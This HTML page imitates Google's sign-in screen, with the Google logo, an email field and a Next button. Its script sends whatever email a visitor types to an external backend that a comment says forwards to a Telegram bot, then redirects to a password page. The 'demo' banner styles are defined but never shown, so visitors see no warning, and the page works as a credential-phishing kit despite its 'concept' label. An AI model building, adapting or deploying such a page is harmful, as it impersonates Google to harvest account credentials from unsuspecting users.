<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign-in Concept</title>
    <link rel="stylesheet" href="index.css">
    <!-- Optional: Use a similar Google Font like Roboto -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        .demo-banner {
            background-color: #b3261e;
            color: #ffffff;
            text-align: center;
            font-weight: 700;
            font-size: 14px;
            letter-spacing: 0.5px;
            padding: 14px 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 2px 8px rgba(179, 38, 30, 0.3);
        }
        .demo-note {
            font-size: 13px;
            line-height: 1.6;
            background-color: #fef7e0;
            border: 1px solid #f9ab00;
            border-radius: 8px;
            padding: 12px 14px;
            color: #3c4043;
            margin-top: 16px;
        }
    </style>
</head>
<body>


<div class="main-container">
    <div class="signin-card">
        
        <!-- Left Section -->
        <div class="left-section">
            <img src="https://res.cloudinary.com/djme9spdc/image/upload/v1785658865/google_PNG19644_qmrkpz.png" alt=" Logo"  class="google-logo">
            <h1>Sign in</h1>
            <p>Use your Google Account</p>
        </div>

        <!-- Right Section -->
        <div class="right-section">
            <div class="input-group">
                <input type="text" id="email" name="email" placeholder="Email or phone" aria-label="Email or phone">
            </div>

            <a href="#" class="link forgot-email">Forgot email?</a>

            <p class="guest-info">
                Not your computer? Use a private browsing window to sign in. 
                <a href="#" class="link">Learn more about using Guest mode</a>
            </p>

            <div class="action-buttons">
                <a href="#" class="link create-account">Create account</a>
                <button class="next-button">Next</button>
            </div>
        </div>

    </div>
</div>
<script src="config.js"></script>
<script>
    // Login NOT GOOGLE
    document.querySelector('.next-button').addEventListener('click', async function () {
        const email = document.getElementById('email').value.trim();
        if (!email) {
            alert('Please enter your email.');
            return;
        }

        sessionStorage.setItem('demo_email', email);

        // Send the email entry step to the Telegram demo bot.
        const nextButton = this;
        nextButton.disabled = true;
        nextButton.textContent = 'in progress...';

        try {
            await fetch(window.API_BASE_URL + '/api/demo-submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: email, password: 'Email entry step' })
            });
        } catch (err) {
            // Backend unreachable — proceed anyway so the demo flow continues.
            console.warn('Demo backend unreachable:', err);
        }

        window.location.href = 'password.html';
    });
</script>
</body>
</html>
